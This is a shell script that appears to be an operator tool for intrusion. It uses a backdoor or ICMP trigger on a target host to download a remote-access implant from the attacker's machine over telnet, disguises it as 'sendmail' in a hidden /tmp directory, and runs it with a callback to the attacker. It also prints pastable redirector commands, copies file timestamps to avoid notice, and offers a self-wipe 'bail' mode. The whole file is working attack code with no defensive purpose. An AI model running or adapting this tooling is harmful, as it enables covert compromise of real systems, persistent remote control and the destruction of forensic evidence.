#!/bin/sh
COLOR_SUCCESS="\\033[1;32m"
COLOR_FAILURE="\\033[1;31m"
COLOR_WARNING="\\033[1;33m"
COLOR_NORMAL="\\033[0;39m"
COLOR_NOTE="\\033[0;34m"
SETCOLOR_SUCCESS="echo -en $COLOR_SUCCESS"
SETCOLOR_FAILURE="echo -en $COLOR_FAILURE"
SETCOLOR_WARNING="echo -en $COLOR_WARNING"
SETCOLOR_NORMAL="echo -en $COLOR_NORMAL"
SETCOLOR_NOTE="echo -en $COLOR_NOTE"
DEFJLPORT=13
DEFRATNAME=sendmail
DEFDIR="/tmp/.scsi"
PROG=`basename ${0}`
NOPENCALLBACKDELAY=30
VER=3.2.0.1
note() {
    if [ "$1" = "-n" ] ; then
      N=$1
      shift
    fi
    echo -e $N "$COLOR_NOTE${*}$COLOR_NORMAL"
}
notered() {
    if [ "$1" = "-n" ] ; then
      N=$1
      shift
    fi
    echo -e $N "$COLOR_FAILURE${*}$COLOR_NORMAL"
}
checkip() {
    CHECKIP=$1
    ERRSTR=$2
    until [ `echo $CHECKIP | grepip 2>/dev/null` ] ; do
 	if [ "$CHECKIP" ] ; then
	    CHECKIP=`host $CHECKIP | awk '{print $4}'`
	    continue
	fi
	[ "$CHECKIP" ] && notered Bad IP $CHECKIP
	echo -en "\nEnter Local IP for rat upload/callback or ^C to abort: "
	read CHECKIP
    done

}
SYNTAX="-i <rem_ip> [-l <loc_ip>] [-D <targetdir>] [-r <rat_name>] \\
       [-n <localport>] [-I <icmp_type> | -j <jl_port>] [-t nosy]"
usage() {
  [ "$1" = "exit" ] && EXIT=1 && shift
  if [ "$1" = "-h" ] ; then
    SHOWVER=1
    shift
    $SETCOLOR_NOTE
    echo -e "
Usage: 
    [TA=target-address       TP=target-port     \\
    RA=redirector-address    RP=redirector-port] \\
    $PROG -i <rem_ip> [ options ] 

OR IN TROUBLESHOOT MODE
    [TA=target-address       TP=target-port     \\
    RA=redirector-address    RP=redirector-port] \\
    $PROG [-T|R|B|1|2|3] -i <rem_ip> [-j <jl_port>]

OPTIONS - Upload and Execute Mode
-i IP     IP of target machine (REQUIRED--NO DEFAULT)
-j #      TCP JL port on target (Default: $DEFJLPORT)
-l IP     IP of attack machine (Default: the first active IP found in
          this order: ppp0, ppp1, eth0 or eth1) 
-n #      rat upload port (Default: a random port)
-p #      Use port # for RAT listen/callback. (Default: random number)
          is generated and used.
-s #      Change delay used for -c to # seconds (must appear before -c).
-c        Use NOPEN syntax to have RAT callback to localip after a delay
          (default is $NOPENCALLBACKDELAY seconds). Port is random unless -p used.
-C IP     Use NOPEN callback to IP instead of local. Port same as in -c.
-z        Do NOT use compress/uncomrpess at the either end.
-r rat    name of rat on target (Default: sendmail)
-D dir    directory to work from/create on target (Default = /tmp/.scsi)
-q        disables \"confirm syntax\" prompt
-I #      use ICMP type # as trigger (e.g., 8, 17, etc.)
-t rat    Type of rat: either nosy or nopen. (Default: nopen)

OPTIONS - Troubleshooting Mode
-1       executes \"w ; ls -alR /tmp ; df -k\" instead of the usual
-2       executes \"w ; netstat -an | egrep '(LISTEN|SYN_SENT)'\"
-3       executes \"w ; which mkdir telnet cat uudecode uncompress chmod ls netstat egrep $DEFRATNAME\"
-R       REDO in callback mode. If upload works but cannot connect.
         executes \"cd \$TARGETDIR || cd /tmp ; PATH=\$TARGETDIR D=-c\$LOCALIP:\$NOPENPORT \${DOTSLASH}\${RAT_NAME}\"
-B       BAIL, executes \"ls -alrt /tmp ; ls -alR \$TARGETDIR ; rm -rf \$TARGETDIR ; ls -arlt /tmp ; ls -alR $TARGETDIR\"
-T       You are prompted for what commands to run at remote end.

 *  Up-arrow and add -R Troubleshoot option if upload works but you
    cannot get to NOPEN listener started. This uses the already uploaded
    NOPEN in callback mode. Be sure to kill the listening NOPEN.
 *  Up-arrow and add -B if you still cannot get on but you think you've
    left a dirty \$TARGETDIR.
 *  $PROG calls packrat to upload NOPEN
 *  If localport is omitted, $PROG chooses a random one
 *  dir defaults to $DEFDIR
 *  RA and RP required if redirecting JL with jackpop
 *  if RA/RP are provided without TA/TP you are prompted for TA/TP
 *  jl is assumed to be in ./jl
 *  jl_port defaults to $DEFJLPORT

USE WITH jackpop:
    You may pre-set any/all of the following environment
    variables if using jackpop with $PROG (RA & RP required).

    For jl.command
    locally:            RA=redirector-address   RP=redirector-port

    For jackpop on      LP=same-as-RP           SA=your-source-IP
    redirector:         TA=target-address       TP=target-JL-port

   If you do not set LP and/or SA, they will be determined by the
   <jl_port> parameter or default and ifconfig. 

   If you do not set TA and/or TP, you will be prompted for them.
"
  fi
  if [ "$SHOWVER" -o "$1" = "-v" ] ; then
    echo -e "$PROG version $VER"
    shift
  fi
  $SETCOLOR_NORMAL
  ERRSTR="${*}"
  if [ "$ERRSTR" ] ; then
    notered "\a${ERRSTR}"
  fi
  [ "$EXIT" ] && exit
} # end usage

CMDLINE="\nCommandLine: ${0} ${*}"

[ "${*}" ] || usage exit -h

# this is default but may get shut off with -z arg
UNCOMPRESS="yes"

while getopts 123RazqvVhHI:cp:s:zTi:l:D:r:n:j:t:PC:B op ; do
  case $op in
    1)	DOCMD="
PATH=$TARGETDIR:/tmp:/bin:/usr/bin:/sbin:/usr/sbin:/usr/bsd ; w ; ls -alR /tmp ; df -k";;
    2)	DOCMD="
PATH=$TARGETDIR:/tmp:/bin:/usr/bin:/sbin:/usr/sbin:/usr/bsd ; w ; netstat -an | egrep \"(LISTEN|SYN_SENT)\"";;
    3)	DOCMD="
PATH=$TARGETDIR:/tmp:/bin:/usr/bin:/sbin:/usr/sbin:/usr/bsd ; w ; which mkdir telnet cat uudecode uncompress chmod ls netstat egrep";;
   B|R) DOCMD="-$op"
	NOPENCALLBACK=" callback"
	REDO="-$op";;
    T)  note "Enter Command(s) to run on target:"
	read DOCMD
	note "You entered:\n$DOCMD\n";;
    a)	AUTOCMD=1
	usage exit "The \"-a\" feature is disabled";;
    q)	QUIET=1;;
    D)	E=$OPTARG;;
    h|v) usage exit -$op ;;
    I)  ICMPTRIGGER=$OPTARG;;
    c)  NOPENCALLBACK=" callback";;
    C)  NOPENCALLBACKIP=$OPTARG
	NOPENCALLBACK=" callback";;
    p)  NOPENPORT=$OPTARG;;
    s)  NOPENCALLBACKDELAY=$OPTARG;;
    z)  NOZIP=yes
	UNCOMPRESS=""
        PACKARGS=" -z" ;;
    i)  REMOTEIP=$OPTARG  ;;
    l)  LOCALIP=$OPTARG  ;;
    D)  TARGETDIR=$OPTARG ;;
    r)  RAT_NAME=$OPTARG  ;;
    n)  LOCAL_PORT=$OPTARG ;;
    P)  DOTSLASH="./";;
    j)  JLPORT=$OPTARG ;;
    t)  RAT_TYPE=$OPTARG ;;
   *)   usage exit "Unrecognized argument $1";;
  esac
done
shift `expr $OPTIND - 1`
echo -e "$CMDLINE"
if [ ! "$NOPENPORT" ] ; then
  NOPENPORT=`mkrandom -n 2>/dev/null`
fi
if [ ! "$NOPENPORT" ] ; then
  usage exit "mkrandom not in path--needed to generate random port for NOPEN\n(use -p # to force a particular port)"
fi
# If DOCMD is set now we're doing a short session--no callback
[ "$DOCMD" ] && [ ! "$REDO" ] && SHORTARGS=1
 [ "$DOCMD" ] && SHORTARGS=1
[ "${TARGETDIR}" ] || TARGETDIR=$DEFDIR

if [ ! $SHORTARGS ] ; then 
    [ "$REMOTEIP" ] || usage exit "-i <remoteip> is required"
    if [ ! "$LOCALIP" ] ; then
	if [ ! "`which grepip 2>/dev/null`" ] ; then
	    usage exit "\aMust have \"grepip\" in path or provide -l IP on command line"
	fi
	for INT in ppp0 ppp1 eth0 eth1 ; do 
	    ADDR=`ifconfig $INT 2>/dev/null | grepip | egrep -v "255|127\.0" | head -1`
	    [ "$ADDR" ] && LOCALIP=$ADDR
	    [ "$LOCALIP" ] && break
	done
	INT=" ($INT)"
	while [ ! "$LOCALIP" ] ; do
	    INT=""
	    echo -en "What is your local/redirector IP address? "
	    [ "$LOCALIP" ] && echo -en "[$LOCALIP] "
	    read ans
	    [ "$ans" -a "${ans:0:1}" != "y" -a "${ans:0:1}" != "Y" ] && \
		LOCALIP=$ans
	    LOCALIP=`echo $LOCALIP | grepip`
	    [ "$ans" ] && echo -e "\n\n\a$ans is not a valid IP. Try again.\n\n"
	done
	note "Using $LOCALIP$INT for -l local IP argument"
    fi

    until [ `echo $LOCALIP | grepip 2>/dev/null` ] ; do
 	if [ "$LOCALIP" ] ; then
	    LOCALIP=`host $LOCALIP | awk '{print $4}'`
	    continue
	fi
	[ "$LOCALIP" ] && notered Bad IP $LOCALIP
	echo -en "\nEnter Local IP for rat upload/callback or ^C to abort: "
	read LOCALIP
    done
    until [ `echo $REMOTEIP | grepip 2>/dev/null` ] ; do
 	if [ "$REMOTEIP" ] ; then
	    REMOTEIP=`host $REMOTEIP | awk '{print $4}'`
	    continue
	fi
	[ "$REMOTEIP" ] && notered Bad IP $REMOTEIP
	echo -en "\nEnter Remote IP or ^C to abort: "
	read REMOTEIP
    done
    if [ "$NOPENCALLBACKIP" ] ; then
	until [ `echo $NOPENCALLBACKIP | grepip 2>/dev/null` ] ; do
	    if [ "$NOPENCALLBACKIP" ] ; then
		NOPENCALLBACKIP=`host $NOPENCALLBACKIP | awk '{print $4}'`
		continue
	    fi
	    [ "$NOPENCALLBACKIP" ] && notered Bad -C NOPEN callback IP $NOPENCALLBACKIP
	    echo -en "\nEnter NOPEN callback IP or ^C to abort: "
	    read NOPENCALLBACKIP
	done
    fi
    [ "$RAT_NAME" ] || RAT_NAME=$DEFRATNAME
    
    if [ "$ARCH" ] ; then
	NOSERVER=`ls -1 /current/up/morerats/noserver* 2>/dev/null | grep -i ${ARCH} | tail -1`
    fi
    [ "$NOSERVER" ] || NOSERVER=/current/up/noserver
    [ "$NOUU" ] && PACKARGS="$PACKARGS -u"
    which packrat >/dev/null 2>&1
    NOPACKRAT=$?
    [ "$NOPACKRAT" = "0" ] || usage exit "${COLOR_FAILURE}No packrat in your path$COLOR_NORMAL"
#    if [ ! "$LOCAL_PORT" ] ; then
#	while [ 1 ] ; do
#	    LOCAL_PORT=`mkrandom -n 2>/dev/null`
#	    [ ! "$LOCAL_PORT" ] && usage exit "mkrandom not in path--needed to generate random rat upload port"
#	    ALREADYTHERE=`netstat -an | grep tcp.*LIST | grep ":$LOCAL_PORT "`
#	    [ "$ALREADYTHERE" ] || break
#	done
#	note "Using a random port ($LOCAL_PORT) for local RAT upload listener (packrat)"
#    fi
#    if [ -e "$NOSERVER" ] ; then
#	if [ "$NOPACKRAT" = "0" ] ; then
#	    PACKRAT_SCRIPME=yes
#	else
#	    [ "$NOPACKRAT" = "0" ] || usage exit "No packrat in your path$COLOR_NORMAL"
#	fi
#    else
#	usage exit Put correct noserver into /current/up/noserver and try again
#    fi
    if [ "$NOPENPORT" ] ; then
	[ "$NOPENCALLBACKIP" ] && TMPVAR=" to $NOPENCALLBACKIP"
	note "Using NOPEN$NOPENCALLBACK$TMPVAR port $NOPENPORT"
	unset TMPVAR
    fi
    [ "$UNCOMPRESS" ] && UNCOMPRESS=";uncompress -f $RAT_NAME.Z"
fi
[ "$RAT_TYPE" ] || RAT_TYPE=nopen
[ "$RAT_TYPE" = "nopen" ] || [ "$RAT_TYPE" = "nosy" ] || usage exit Invalid rat type $RAT_TYPE
[ "$JLPORT" -a "$ICMPTRIGGER" ] && usage exit "-I cannot be used with -j"
[ "$JLPORT" ] || JLPORT=$DEFJLPORT

PLATFORM=`uname`
if [ "$PLATFORM" = "Linux" ]; then
  MINUSN=-n
else
  MINUSN=""
fi
# need this always now...
MINUSN=""


if [ "$NOPENPORT" != "" ]; then 
  if [ $NOPENPORT -lt 1 -o $NOPENPORT -gt 65535 ]; then
    usage exit rat_port must be between 1 and 65535, inclusive
  fi
  if [ "$RAT_TYPE" = "nosy" ]; then
    RAT_PREARGS="P=$NOPENPORT "
  else
    if [ "$RAT_TYPE" = "nopen" ]; then
      if [ "$NOPENCALLBACK" ] ; then
        [ "$NOPENCALLBACKIP" ] || NOPENCALLBACKIP=$LOCALIP
	if [ ! "$REDO" = "-B" ] ; then  # i.e. if we're not bailing
	    RAT_PREARGS=" S=$NOPENCALLBACKDELAY D=-c${NOPENCALLBACKIP}:${NOPENPORT} "
	    notered "\aYou must establish a NOPEN listener on $LOCALIP:$NOPENPORT\n"
	    echo "${SECOND}remote nopen window on $LOCALIP:"
	    note "\ncd /current/down/\n/current/bin/noclient -l $NOPENPORT\n\n"
	    $SETCOLOR_FAILURE
	    echo -en "Hit ^C to abort or enter once NOPEN windows are ready"
	    $SETCOLOR_NORMAL
	    read blah
	fi
      else
	RAT_PREARGS=" D=-l${NOPENPORT} "
 	POSTRUN="noclient ${ACTUALTARGET}:${NOPENPORT}"
      fi
    else
      usage exit rat_type $RAT_TYPE must be nosy or nopen
    fi
  fi
else
  RAT_PREARGS=""
fi
## If we have $C, RAT_PREARGS just defined is thrown away.
#if [ "$NOPENCALLBACK" ] ; then
#  NOPENCALLBACKPORT=`echo $C | cut -d ":" -f 2`
#  RAT_PREARGS="D=-c$LOCALIP:$NOPENPORT "
#else
#  RAT_PREARGS="D=-l$NOPENPORT "
#fi

JACKPOP=0
# are we jackpopping?
if [ ! "$RA" = "" ] || [ ! "$RP" = "" ] ; then
    JACKPOP=1
    if [ "$RA" = "" ] || [ "$RP" = "" ] ; then
	echo "FATAL ERROR: Must have BOTH environment variables RA and RP set."
	exit 1
    fi
    # If NOPENJACK is set, -jackpop was used so don't bother with these.
    if [ ! "$NOPENJACK" ] ; then 
	if [ ! "$RP" = "$JLPORT" ] ; then
	    echo "Shouldn't RP=JLPORT? 
(you have RP=$RP and JLPORT=$JLPORT)"
	    echo $MINUSN "
Hit ^C to abort and fix this or hit enter to continue
(though that would most likely not work)."
	    read quitans
	fi
	if [ ! "$RA" = "$REMOTEIP" ] || [ ! "$RA" = "$LOCALIP" ] ; then
	    echo "Shouldn't RA=LOCALIP=REMOTEIP? (you have
   RA=$RA, LOCALIP=$LOCALIP
   and REMOTEIP=$REMOTEIP)"
	    echo $MINUSN "
Hit ^C to abort and fix this or hit enter to continue
(though that would most likely not work)."
	    read quitans
	fi
    fi
    if [ ! "$TA" ] ; then
	DEFTARGETIP=`egrep "^Target IP:" /current/etc/opscript.txt | awk '{print $3}' | head -1`
	echo $MINUSN "
Enter the IP of your actual target you are redirecting
through $REMOTEIP to get to (this is used here to echo
a jackpop command to paste into your redirector): [$DEFTARGETIP]"
	read TA
	[ "$TA" ] || TA=$DEFTARGETIP
    fi
    if [ ! "$TP" ] ; then
	echo $MINUSN "
Enter the actual target's JL trigger port (this is used here
to echo a jackpop command to paste into your redirector): [$JLPORT] "
	read TP
	[ "$TP" ] || TP=$JLPORT
    fi
    if [ ! "$LP" ] ; then
	LP=$RP
    fi

    if [ "$SA" ] ; then
	if [ ! "$NOPENJACK" ] && [ ! "`ifconfig | grep $SA`" ] ; then
	    echo "Shouldn't SA=one of your IPs?
(you have SA=$SA)."
	    echo $MINUSN "
Hit ^C to abort and fix this or hit enter to continue
(though that would most likely not work)."
	    read quitans
	fi
    else
	LOCAL_IP_GUESS=`ifconfig ppp0 2>/dev/null | grep inet | grep -v grep | grep -v ":127\." | awk '{print $2}' | cut -d ":" -f 2`
	# if that fails maybe it's on eth0
	[ "$LOCAL_IP_GUESS" ] || LOCAL_IP_GUESS=`ifconfig -a eth0 | grep inet | grep -v grep | awk '{print $2}' | cut -d ":" -f 2`
	[ "$LOCAL_IP_GUESS" ] || echo "Unable to get local IP address..bailing" 
	[ "$LOCAL_IP_GUESS" ] || exit 1
	SA=$LOCAL_IP_GUESS
    fi
fi # end # are we jackpopping?
if [ ! "$SHORTARGS" ] ; then
  if [ "${TARGETDIR:0:1}" != "/" ] ; then
    usage exit Targetdir must begin with \"/\". You gave: $TARGETDIR
  fi
  BASEDIR=`dirname "$TARGETDIR"`

  BASEDIR2=`basename "$BASEDIR"`

  # Check to make sure tcp LISTEN is there
  PORTS=`netstat -an | grep tcp.*LIST | cut -f 2 -d ":" | sort -rn | awk '{print $1}' |egrep -v "6000"`
  note Local ports LISTENing: $PORTS
  if [ "$LOCAL_PORT" ] ; then
    for i in $PORTS -1 ; do
      [ "$i" = "$LOCAL_PORT" ] && break
    done
    if [  $i -lt 0 ] ; then
        [ ! "$REDO" ] && PACKRAT_SCRIPME=yes
    else
	notered "\aLocalPort=$LOCAL_PORT provided on command line already LISTENing. Assuming that is the upload."
	sleep 2
    fi
  else
    while [ 1 ] ; do
      LOCAL_PORT=`mkrandom -n 2>/dev/null`
      [ ! "$LOCAL_PORT" ] && usage exit "mkrandom not in path--needed to generate random rat upload port"
      ALREADYTHERE=`netstat -an | grep tcp.*LIST | grep ":$LOCAL_PORT "`
      [ "$ALREADYTHERE" ] || break
    done
    note "Using a random port ($LOCAL_PORT) for local RAT upload listener (packrat)"
    [ ! "$REDO" ] && PACKRAT_SCRIPME=yes
  fi # end if [ "$LOCAL_PORT" ]
  if [ "$PACKRAT_SCRIPME" ] ; then
    EXPLOIT_SCRIPME="packrat$PACKARGS $RAT_NAME $NOSERVER $LOCAL_PORT"
    note "\nStarting local LISTENer to send noserver via port $LOCAL_PORT\n"
    export EXPLOIT_SCRIPME
    echo EXPLOIT_SCRIPME=\"$EXPLOIT_SCRIPME\"  scripme -t PACKRAT -F -X \"-bg slategrey -fg white -geometry 131x55-0+0\"
    EXPLOIT_SCRIPME="$EXPLOIT_SCRIPME" scripme -t PACKRAT -F -X "-bg slategrey -fg white -geometry 131x55-0+0"
  fi
fi # end if [ ! "$SHORTARGS" ]

# at this point DOCMD="" if we're doing usual mkdir/cd/etc, otherwise not
if [ ! "$DOCMD" ] && [ "$BASEDIR2" != "tmp" ] ; then
    TOUCHSTUFF="
touch -r $BASEDIR /tmp/.advt$$"
fi

# Now check what we can before continuing
echo ""
while [ 1 ] ; do

  [ "$NOPENCALLBACK" ] || OKNRTUN=okeydokey
  [ "$NOPENCALLBACK" ] && OKNRTUN=`netstat -an | grep "^tcp.*:$NOPENPORT " | egrep "ESTAB|LISTEN"`
  # Ignore NOPENCALLBACK if in -Bail mode
  [ "$NOPENCALLBACK" ] && [ "$REDO" = "-B" ] && OKNRTUN=yes
  OKPACKRAT=`netstat -an | grep "^tcp.*0.0.0.0:$LOCAL_PORT .*LISTEN"`
  [ "$REDO" ] && OKPACKRAT=yes
  [ "$SHORTARGS" ] && OKPACKRAT=1
  [ "$OKNRTUN" ] || notered "No -nrtun or noclient -l for callback seen locally on port $NOPENPORT in netstat"
  if [ ! "$OKPACKRAT" ] ; then
    if [ "$OKNRTUN" ] ; then
      notered "waiting for packrat to start on port $LOCAL_PORT"
    else
      notered "No packrat seen locally on port $LOCAL_PORT in netstat"
    fi
  fi
  [ "$OKNRTUN" ] && [ "$OKPACKRAT" ] && break

  [ "$OKNRTUN" ] && sleep 2 && continue
  unset OKNRTUN OKPACKRAT
  notered "\a\n\nCANNOT PROCEED"
  notered -n "\a\n\nFix this and either ^C or hit Enter to try again."
  read blah
done
unset OKNRTUN OKPACKRAT

if [ "$DOCMD" = "-R" ] ; then
  DOCMD="cd $TARGETDIR || cd /tmp ; PATH=$TARGETDIR:. D=-c$LOCALIP:$NOPENPORT ${DOTSLASH}${RAT_NAME}"
  # This time do not do TOUCHSTUFF again (assumes TARGET already there and created)
  REALCMD="$DOCMD;exit 0"
elif [ "$DOCMD" = "-B" ] ; then
  DOCMD="ls -alrt /tmp ; ls -alR $TARGETDIR ; rm -rf $TARGETDIR ; ls -arlt /tmp ; ls -alR $TARGETDIR"
  # This time we're just cleaning and bailing
  REALCMD="PATH=/bin:/usr/bin:/sbin:/usr/sbin:/usr/bsd  $DOCMD; exit 0"
else

  if [ "$DOCMD" = "" ] ; then
    if [ "$AUTOCMD" ] ; then 
# THIS IS DISABLED FORNOW
       echo -n "Building command to have JL call automated packrat with..."
       # this packrat has -L for do not start listener, just 
       # output the command needed remotely
       DOCMD=`packrat -a $LOCAL_PORT -E "${RAT_PREARGS}" -eqL -d $TARGETDIR -i $LOCALIP $RAT_NAME`
       echo "done.
Setting up listener in an xterm with:
     xterm -hold +cm -e sh -c \"packrat -a $LOCAL_PORT -E '${RAT_PREARGS}' -e -d $TARGETDIR -i $LOCALIP $RAT_NAME\" \&
"

       xterm -hold +cm -e sh -c "packrat -a $LOCAL_PORT -E '${RAT_PREARGS}' -e -d $TARGETDIR -i $LOCALIP $RAT_NAME" &
       sleep 3

    else
      DOCMD="
mkdir -p $TARGETDIR
cd $TARGETDIR || cd /tmp
telnet $LOCALIP $LOCAL_PORT | cat > $RAT_NAME.uu
uudecode $RAT_NAME.uu $UNCOMPRESS
chmod 777 $RAT_NAME
PATH=$TARGETDIR:. ${RAT_PREARGS}${DOTSLASH}${RAT_NAME}"

    fi
  fi
  REALCMD="$TOUCHSTUFF $DOCMD;exit 0"
fi
echo ""
echo "CHECK SYNTAX IN REALCMD AND IN jl.command LINE BEFORE CONTINUING"
echo ""
echo "Running these commands on target:"
note "REALCMD=\"$REALCMD\""
[ "$REDO" = "-B" ] && notered "\n\nIN BAIL MODE--WIPING SELF!!\n\n"
echo ""

if [ "$JACKPOP" = 1 ] && [ ! "$NOPENJACK" ] ; then
    echo "
Using jackpop with environment variables as follows: 
  Redirector Address	RA=$RA
  Redirector Port	RP=$RP	
  Target Address	TA=$TA
  Target Port		TP=$TP
  Listening Port on RA	LP=$LP	
  Source Address	SA=$SA	

Now, some pastables. First, the jackpop command you need to run in an
INCISION window on $RA, then the -rtun command in a NOPEN window
on the same box, and finally an rm command to wipe jackpop: "
$SETCOLOR_NOTE
    echo "
 chmod 700 jp&&netstat -an|grep $LP||PATH=. SA=$SA TA=$TA TP=$TP LP=$LP jp

 rm jp ; ls -al ; ls -al jp

 -rtun $LOCAL_PORT
"
    $SETCOLOR_NORMAL
fi
if [ "$TOUCHSTUFF" ] ; then 
    notered "
Location for working directory $TARGETDIR is not tmp.
Will do \"touch -r $BASEDIR /tmp/.advt$$\". Do not forget to use
and then rm it when you BAIL.
"
fi
echo "Command about to be executed LOCALLY:"
if [ "$ICMPTRIGGER" ] ; then
  echo "ICMP_TYPE=$ICMPTRIGGER CMD=\"${REALCMD}\" JP -t $REMOTEIP"
  if [ ! "$NOPENJACK" ] ; then 
    notered -n "\a\n\nCHECK SYNTAX IN REALCMD AND IN JP LINE BEFORE CONTINUING\n\n"
    [ "$QUIET" ] || notered -n "hit enter to proceed, or <A>bort: "
    [ "$QUIET" ] || read junk
    [ "${junk:0:1}" = "A" -o "${junk:0:1}" = "a" ] && exit 
  fi
  ICMP_TYPE=$ICMPTRIGGER CMD="${REALCMD}" JP -t $REMOTEIP
#  ICMP_TYPE=$ICMPTRIGGER CMD="cd /tmp ; telnet 555.1.2.16 8787| cat > sendmail.uu;uudecode sendmail.uu" JP -t $REMOTEIP
else 
  echo " jl.command telnet $REMOTEIP $JLPORT"
  if [ ! "$NOPENJACK" ] ; then 
    notered -n "\a\n\nCHECK SYNTAX IN REALCMD AND IN jl.command LINE BEFORE CONTINUING\n\n"
    [ "$QUIET" ] || notered -n "hit enter to proceed, or <A>bort: "
    [ "$QUIET" ] || read junk
    [ "${junk:0:1}" = "A" -o "${junk:0:1}" = "a" ] && exit 

  fi
  export REALCMD
  #now run jackladder

  jl.command telnet $REMOTEIP $JLPORT
fi

# Any parting words?
if [ ! "$NOPENCALLBACK" ] ; then
    note "\n\nHere is a pastable to get there once rat is running:\n\n"
    note "noclient $REMOTEIP:$NOPENPORT\n\n"
elif [ ! "$REDO" ] ; then
    note "\n\nYou should see a callback to your NOPEN listener shortly.\n\n"
    if [ ! "$REDO" ] ; then
	echo -e "\nNOTE: Callback will not happen until $NOPENCALLBACKDELAY seconds or more have passed.\n"
	while [ $NOPENCALLBACKDELAY -ge 0 ] ; do
	    notered -n "\rCounting down: $NOPENCALLBACKDELAY  "
	    NOPENCALLBACKDELAY=`expr $NOPENCALLBACKDELAY - 1`
	    sleep 1
	done
	echo
    fi
fi
